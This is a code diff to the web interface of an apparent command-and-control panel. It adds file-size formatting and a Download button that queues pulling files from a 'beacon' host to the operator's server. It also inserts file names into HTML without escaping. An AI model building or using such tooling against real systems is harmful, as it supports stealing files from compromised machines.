@@ -331,6 +331,20 @@
             loadBeacons();
         };
 
+        function humanFileSize(bytes) {
+            if (bytes === "N/A") return "N/A";
+            const thresh = 1024;
+            if (Math.abs(bytes) < thresh) return bytes + ' B';
+            const units = ['KB','MB','GB','TB'];
+            let u = -1;
+            do {
+                bytes /= thresh;
+                ++u;
+            } while(Math.abs(bytes) >= thresh && u < units.length - 1);
+            return bytes.toFixed(1) + ' ' + units[u];
+        }
+
+
             let currentBeacon = "";
             let modalOpen = false;
             let showInactive = false; // Hide inactive by default
@@ -541,11 +555,34 @@
                     let nextPath = path + sep + entry.name + (path.includes('\\') ? '\\' : '/');
                     rows += `<tr><td>📁</td><td><a href="#" style="color:var(--accent);" onclick="openFileBrowser(currentBrowseHost, '${nextPath}'); return false;">${entry.name}</a></td><td>Folder</td></tr>`;
                 } else {
-                    rows += `<tr><td>📄</td><td>${entry.name}</td><td>${entry.size} bytes</td></tr>`;
+                    rows += `<tr>
+                        <td>📄</td>
+                        <td>${entry.name}</td>
+                        <td>${humanFileSize(entry.size)}</td>
+                        <td>
+                            <button onclick="downloadFileFromBeacon('${currentBrowseHost}', '${path.replace(/\\/g, '\\\\')}${(path.endsWith('/')||path.endsWith('\\\\'))?'':'/'}${entry.name}')"
+                                style="background:#232; color:#aaffaa; font-weight:bold; border:none; border-radius:2px; padding:2px 10px; box-shadow:0 0 6px #22ff44aa; cursor:pointer;">
+                                Download
+                            </button>
+                        </td>
+                    </tr>`;
+
                 }
             }
             document.getElementById('file-browser-table').innerHTML = rows;
         }
+        
+        function downloadFileFromBeacon(hostname, filepath) {
+            fetch(`/api/download/${hostname}?path=${encodeURIComponent(filepath)}`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.status === "queued") {
+                        alert("Download task queued! Check Task History for status and download from server/downloads when complete.");
+                    } else {
+                        alert("Failed to queue download task.");
+                    }
+                });
+    }
 
         function closeFileBrowser() {
             document.getElementById('file-browser-modal').style.display = 'none';
